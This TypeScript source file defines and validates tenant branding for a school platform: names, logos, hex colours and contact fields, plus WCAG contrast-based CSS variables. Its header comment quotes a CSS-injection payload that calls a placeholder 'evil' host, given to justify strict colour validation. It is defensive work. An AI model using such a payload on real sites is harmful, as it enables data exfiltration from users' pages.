/**
 * Tenant branding — the one definition of what a school's identity is.
 *
 * R-1 of docs/11-MASTER-PLAN.md. The product is one codebase serving many
 * institutions, and an institution must never see another's identity — or
 * the platform's — on its own screens or its own printed paper.
 *
 * ── Why this lives in ui-core ────────────────────────────────────────────
 * Both sides need the same rules. The browser wants them for instant
 * feedback in the branding editor; the server needs them because the
 * browser's copy is advice, not enforcement. Two implementations of one
 * schema drift, and the direction they drift is always "the server accepts
 * something the editor would have refused". So there is one module, it has
 * zero dependencies and touches no DOM and no node API, and both import it.
 *
 * The server remains the authority: services/ops-svc/api/branding.ts
 * re-validates every write with parseBranding() before it reaches the
 * database, regardless of what the client believed.
 *
 * ── Why colours are validated so strictly ───────────────────────────────
 * primaryColor lands in a CSS custom property. An unvalidated string there
 * is a style-injection vector — `red; background: url(//evil/?c=` closes
 * the declaration and opens another. HEX_RE is an allowlist, not a
 * sanitiser, and normaliseColor() throws rather than repairing anything it
 * does not recognise.
 *
 * ── Why SVG is refused for uploaded assets ──────────────────────────────
 * An SVG is a document, not an image: it can carry <script>, and a school
 * IT account is not a trust boundary we want to bet an XSS on. Raster only.
 */

export interface Branding {
  /** Institution name in Bangla — the primary name everywhere in the UI. */
  nameBn: string;
  /** Institution name in English — used on printed documents and en locale. */
  nameEn: string;
  /** Short name for tight spaces: tab bars, PWA short_name, print footers. */
  shortName: string;
  /** Logo shown in the shell, on login, and at the head of every document. */
  logoUrl: string;
  /** Browser tab icon and PWA install icon. */
  faviconUrl: string;
  /** Brand colour: primary buttons, active nav, PWA theme colour. */
  primaryColor: string;
  /** Secondary colour for accents that must not compete with primary. */
  accentColor: string;
  address: string;
  phone: string;
  email: string;
  website: string;
  /** Faint full-page mark behind printed documents. */
  watermarkUrl: string;
  /** Head of institution, printed above the signature line. */
  headmasterName: string;
  /** Authorised signature image for receipts, certificates, testimonials. */
  signatureUrl: string;
}

/**
 * What an unauthenticated caller may learn about a tenant.
 *
 * Everything here is on the institution's signboard: its name, its logo,
 * its colours. The login screen needs exactly this much to stop showing
 * the platform's brand to a school's users, and not one field more —
 * address, phone, email, headmaster and the document assets stay behind
 * authentication because a directory of every school's contact details is
 * a scrape, not a feature.
 */
export type PublicBranding = Pick<
  Branding,
  'nameBn' | 'nameEn' | 'shortName' | 'logoUrl' | 'faviconUrl' | 'primaryColor' | 'accentColor'
>;

export const PUBLIC_BRANDING_FIELDS = [
  'nameBn', 'nameEn', 'shortName', 'logoUrl', 'faviconUrl', 'primaryColor', 'accentColor',
] as const satisfies readonly (keyof Branding)[];

/**
 * The fallback identity. Deliberately neutral rather than ShikhonBD's own
 * brand: a tenant whose branding has not been filled in yet should look
 * unbranded, not look like a different institution. The colours are the
 * Ata Ekta design-system defaults so an unconfigured school still gets a
 * coherent, accessible theme rather than browser blue.
 */
export const DEFAULT_BRANDING: Branding = Object.freeze({
  nameBn: 'শিক্ষা প্রতিষ্ঠান',
  nameEn: 'Institution',
  shortName: 'প্রতিষ্ঠান',
  logoUrl: '',
  faviconUrl: '',
  primaryColor: '#D23B2E',
  accentColor: '#4E7A94',
  address: '',
  phone: '',
  email: '',
  website: '',
  watermarkUrl: '',
  headmasterName: '',
  signatureUrl: '',
});

/** Per-field limits. Text caps are generous for Bangla, which is longer. */
export const LIMITS = Object.freeze({
  nameBn: 120,
  nameEn: 120,
  shortName: 32,
  address: 300,
  phone: 40,
  email: 120,
  website: 200,
  headmasterName: 120,
  /** Data-URL byte caps. base64 inflates by 4/3, so 64 KB ≈ a 48 KB image. */
  logoUrl: 64 * 1024,
  faviconUrl: 32 * 1024,
  watermarkUrl: 96 * 1024,
  signatureUrl: 48 * 1024,
});

const HEX_RE = /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/;
/** Raster only — see the file header on why SVG is refused. */
const DATA_IMAGE_RE = /^data:image\/(?:png|jpeg|webp);base64,[A-Za-z0-9+/]+={0,2}$/;
const HTTPS_RE = /^https:\/\/[^\s"'<>]+$/;
const PATH_RE = /^\/[^\s"'<>]*$/;
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
/** BD numbers dominate, but a landline or a second number must still fit. */
const PHONE_RE = /^[0-9+][0-9\s+\-(),]{4,39}$/;

export class BrandingError extends Error {
  readonly field: string;
  constructor(field: string, message: string) {
    super(message);
    this.field = field;
  }
}

/**
 * `#abc` → `#aabbcc`, `#AABBCC` → `#aabbcc`. Throws on anything else.
 * Normalising rather than merely accepting means two tenants that chose the
 * same colour compare equal, and the value written to a stylesheet always
 * has one shape.
 */
export function normaliseColor(field: string, value: string): string {
  const v = value.trim();
  if (!HEX_RE.test(v)) {
    throw new BrandingError(field, `${field} must be a hex colour like #1A73E8`);
  }
  const hex = v.slice(1).toLowerCase();
  return '#' + (hex.length === 3 ? hex.split('').map((c) => c + c).join('') : hex);
}

/**
 * An asset reference is one of: empty (no asset), an inline raster data
 * URL, an absolute https URL, or a same-origin path. Anything else — and
 * `javascript:` and `data:text/html` in particular — is refused.
 */
export function validateAssetUrl(field: string, value: string, maxBytes: number): string {
  const v = value.trim();
  if (v === '') return '';
  if (v.length > maxBytes) {
    throw new BrandingError(field, `${field} exceeds ${Math.floor(maxBytes / 1024)} KB`);
  }
  if (DATA_IMAGE_RE.test(v) || HTTPS_RE.test(v) || PATH_RE.test(v)) return v;
  throw new BrandingError(
    field,
    `${field} must be a PNG, JPEG or WebP image, an https URL, or a site path`,
  );
}

function text(field: string, value: unknown, max: number, fallback: string): string {
  if (value === undefined || value === null) return fallback;
  if (typeof value !== 'string') throw new BrandingError(field, `${field} must be text`);
  // Control characters would survive into a printed document and a page
  // title; strip them here rather than discovering them in a PDF.
  const v = value.replace(/[\u0000-\u001f\u007f]/g, '').trim();
  if (v.length > max) throw new BrandingError(field, `${field} must be ${max} characters or fewer`);
  return v;
}

/**
 * Validate and normalise arbitrary input into a complete Branding.
 *
 * Missing fields fall back to `base` (an existing saved branding for a
 * partial update, or DEFAULT_BRANDING for a fresh one), so a PUT carrying
 * only the fields the editor changed cannot blank the rest.
 *
 * Throws BrandingError — never returns a partially-valid object. A branding
 * that half-applied would leave a school showing another identity in
 * whichever half failed.
 */
export function parseBranding(input: unknown, base: Branding = DEFAULT_BRANDING): Branding {
  if (input === null || typeof input !== 'object' || Array.isArray(input)) {
    throw new BrandingError('branding', 'branding must be an object');
  }
  const i = input as Record<string, unknown>;

  const nameBn = text('nameBn', i.nameBn, LIMITS.nameBn, base.nameBn);
  const nameEn = text('nameEn', i.nameEn, LIMITS.nameEn, base.nameEn);
  if (nameBn === '' && nameEn === '') {
    throw new BrandingError('nameBn', 'an institution needs a name in Bangla or English');
  }

  const email = text('email', i.email, LIMITS.email, base.email);
  if (email !== '' && !EMAIL_RE.test(email)) {
    throw new BrandingError('email', 'email is not a valid address');
  }
  const phone = text('phone', i.phone, LIMITS.phone, base.phone);
  if (phone !== '' && !PHONE_RE.test(phone)) {
    throw new BrandingError('phone', 'phone is not a valid number');
  }
  const website = text('website', i.website, LIMITS.website, base.website);
  if (website !== '' && !HTTPS_RE.test(website)) {
    throw new BrandingError('website', 'website must be a full https:// address');
  }

  const asset = (f: 'logoUrl' | 'faviconUrl' | 'watermarkUrl' | 'signatureUrl'): string =>
    i[f] === undefined || i[f] === null
      ? base[f]
      : typeof i[f] === 'string'
        ? validateAssetUrl(f, i[f] as string, LIMITS[f])
        : (() => { throw new BrandingError(f, `${f} must be text`); })();

  return {
    nameBn,
    nameEn,
    // Falling back to the Bangla name beats falling back to "প্রতিষ্ঠান":
    // a school that never filled this in still gets its own name in the
    // places that are too tight for the full one.
    shortName: text('shortName', i.shortName, LIMITS.shortName, base.shortName) || nameBn || nameEn,
    logoUrl: asset('logoUrl'),
    faviconUrl: asset('faviconUrl'),
    primaryColor: i.primaryColor === undefined || i.primaryColor === null
      ? base.primaryColor
      : normaliseColor('primaryColor', String(i.primaryColor)),
    accentColor: i.accentColor === undefined || i.accentColor === null
      ? base.accentColor
      : normaliseColor('accentColor', String(i.accentColor)),
    address: text('address', i.address, LIMITS.address, base.address),
    phone,
    email,
    website,
    watermarkUrl: asset('watermarkUrl'),
    headmasterName: text('headmasterName', i.headmasterName, LIMITS.headmasterName, base.headmasterName),
    signatureUrl: asset('signatureUrl'),
  };
}

/** Narrow a full branding to the fields an unauthenticated caller may see. */
export function publicBranding(b: Branding): PublicBranding {
  return {
    nameBn: b.nameBn,
    nameEn: b.nameEn,
    shortName: b.shortName,
    logoUrl: b.logoUrl,
    faviconUrl: b.faviconUrl,
    primaryColor: b.primaryColor,
    accentColor: b.accentColor,
  };
}

/**
 * The display name for a given locale, with a fallback to the other
 * language. A school that filled in only one name still has a name.
 */
export function brandName(b: Pick<Branding, 'nameBn' | 'nameEn'>, locale = 'bn'): string {
  return locale === 'en' ? (b.nameEn || b.nameBn) : (b.nameBn || b.nameEn);
}

/**
 * CSS custom properties that repaint the app in a tenant's colours.
 *
 * ── Which tokens, and why these ─────────────────────────────────────────
 * apps/pwa/public/app.css writes every rule against the SEMANTIC aliases
 * (--c-primary and friends), not against the raw palette, precisely so the
 * palette can be re-pointed in one place. That is the seam this uses. The
 * older --color-primary names are emitted too, because the design-system
 * stylesheet under public/design/ still reads them.
 *
 * --c-accent is deliberately NOT emitted. In this stylesheet it means
 * "destructive / error", and repainting it with a school's brand colour
 * would make every delete confirmation look like a primary action.
 * Likewise the status colours: a school may choose its brand, not what
 * "absent" or "overdue" look like.
 *
 * ── Why light and dark are separate ─────────────────────────────────────
 * The dark block in app.css re-points --c-primary-text, --c-primary-ink,
 * --c-link and --c-primary-soft at LIGHTER steps of the accent ramp,
 * because text that clears 4.5:1 on a white ground fails badly on a
 * near-black one. A single set of overrides would either be overridden by
 * that block (higher specificity) or would win and drag unreadable dark
 * text into dark mode. So both are derived, each from the same brand hue.
 *
 * Returned as data rather than written here so the caller decides where it
 * lands, and so this stays testable with no DOM.
 */
export interface BrandingCssVars {
  light: Record<string, string>;
  dark: Record<string, string>;
}

export function brandingCssVars(
  b: Pick<Branding, 'primaryColor' | 'accentColor'>,
): BrandingCssVars {
  const p = b.primaryColor;
  const a = b.accentColor;
  // Derived once, used by both blocks. A pale brand needs a different label
  // colour and a deeper text step; a normal one gets exactly what it always
  // got, because the loops return on their first iteration.
  const onFill = onBrandFill(p);
  const softLight = mixWithWhite(p, 0.88);
  const softDark = shade(p, -0.62);
  return {
    light: {
      // The label for anything filled with --c-primary. Seventeen rules in
      // app.css used a literal #fff; they read this instead.
      '--c-on-primary': onFill,
      // Semantic aliases — what every rule in app.css actually reads.
      '--c-primary': p,
      '--c-primary-flat': p,
      // Text has a stricter contrast obligation than a fill carrying white
      // label text, so it steps down the same hue rather than reusing it.
      '--c-primary-text': readableBrandText(p, softLight, -0.28, -0.05),
      '--c-primary-ink': shade(p, -0.45),
      '--c-primary-soft': softLight,
      '--c-link': readableBrandText(p, softLight, -0.28, -0.05),
      '--c-info': a,
      '--c-info-soft': mixWithWhite(a, 0.88),
      // Raw palette names, for public/design/styles.css.
      '--color-primary': p,
      '--color-primary-hover': shade(p, -0.16),
      '--color-primary-soft': mixWithWhite(p, 0.88),
      '--color-primary-ink': shade(p, -0.38),
      '--color-info': a,
    },
    dark: {
      '--c-on-primary': onFill,
      '--c-primary': p,
      '--c-primary-flat': p,
      // Lightened, mirroring how app.css moves from accent-700 to
      // accent-400 on a near-black ground.
      '--c-primary-text': readableBrandText(p, softDark, 0.42, 0.05),
      '--c-primary-ink': shade(p, 0.58),
      '--c-primary-soft': softDark,
      '--c-link': readableBrandText(p, softDark, 0.42, 0.05),
      '--c-info': shade(a, 0.38),
      '--c-info-soft': shade(a, -0.6),
      '--color-primary': p,
      '--color-primary-hover': shade(p, 0.12),
      '--color-primary-soft': shade(p, -0.62),
      '--color-primary-ink': shade(p, 0.5),
      '--color-info': shade(a, 0.38),
    },
  };
}

function channels(hex: string): [number, number, number] {
  const h = hex.slice(1);
  return [
    parseInt(h.slice(0, 2), 16),
    parseInt(h.slice(2, 4), 16),
    parseInt(h.slice(4, 6), 16),
  ];
}

function toHex(rgb: [number, number, number]): string {
  return '#' + rgb.map((c) => Math.max(0, Math.min(255, Math.round(c)))
    .toString(16).padStart(2, '0')).join('');
}

/** Darken (amount < 0) or lighten (amount > 0) by a fraction of the channel. */
export function shade(hex: string, amount: number): string {
  const [r, g, b] = channels(hex);
  const f = (c: number) => (amount < 0 ? c * (1 + amount) : c + (255 - c) * amount);
  return toHex([f(r), f(g), f(b)]);
}

/** Tint towards white — `ratio` 0.88 means 88% white, the -soft token shape. */
export function mixWithWhite(hex: string, ratio: number): string {
  const [r, g, b] = channels(hex);
  const f = (c: number) => c + (255 - c) * ratio;
  return toHex([f(r), f(g), f(b)]);
}

/**
 * Relative luminance per WCAG 2.1, and the contrast ratio between two
 * colours. Used by the branding editor to warn a school that its chosen
 * brand colour will not carry white button text — the one accessibility
 * regression a colour picker can introduce on every screen at once.
 */
export function luminance(hex: string): number {
  const srgb = channels(hex).map((c) => {
    const s = c / 255;
    return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4);
  });
  return 0.2126 * srgb[0] + 0.7152 * srgb[1] + 0.0722 * srgb[2];
}

export function contrastRatio(a: string, b: string): number {
  const la = luminance(a);
  const lb = luminance(b);
  const [hi, lo] = la > lb ? [la, lb] : [lb, la];
  return (hi + 0.05) / (lo + 0.05);
}

/**
 * The label colour for text sitting ON a brand fill.
 *
 * White for most school colours, but a school may legitimately choose a pale
 * one — a yellow, a light teal, the sort of colour a crest is actually
 * printed in. White on `#E5B300` is **1.95:1**, and the app puts white on the
 * brand in seventeen places: the primary button, the notification badge, the
 * avatar, the calendar's selected day, the audience chips.
 *
 * The branding editor already WARNED about this ("advice, not a refusal" —
 * a school may have a light brand and we do not get to veto it), but nothing
 * acted on the warning, so choosing a pale colour quietly degraded every
 * screen at once. This acts on it: the fill stays exactly the colour the
 * school chose, and only the LABEL moves.
 *
 * A deep shade of the school's own hue rather than black — black on a brand
 * fill reads as a different palette leaking in, and this way the button still
 * looks like it belongs to the school.
 */
export function onBrandFill(fill: string): string {
  if (contrastRatio(fill, '#ffffff') >= 4.5) return '#ffffff';
  for (let a = -0.6; a >= -0.95; a -= 0.05) {
    const c = shade(fill, a);
    if (contrastRatio(fill, c) >= 4.5) return c;
  }
  return '#141414';
}

/**
 * A brand-hued text colour guaranteed to clear AA on the ground it sits on.
 *
 * `shade(p, -0.28)` is the right step for most hues and not enough for a
 * pale one: on `#E5B300` it lands at `#A58100`, which is 3.38:1 on that
 * brand's own soft tint — and that pair is what paints the ACTIVE sidebar
 * row, so a school with a yellow crest could not read which page it was on.
 * Keeps stepping the same hue until the ratio is met rather than jumping to
 * a neutral, so the result is still recognisably the school's colour.
 */
export function readableBrandText(hue: string, ground: string, start: number, step: number): string {
  let a = start;
  for (let i = 0; i < 16; i++) {
    const c = shade(hue, a);
    if (contrastRatio(c, ground) >= 4.5) return c;
    a += step;
  }
  return shade(hue, a);
}

/** WCAG AA for normal-size text is 4.5:1. Buttons carry white label text. */
export function meetsAaOnWhiteText(hex: string): boolean {
  return contrastRatio(hex, '#ffffff') >= 4.5;
}
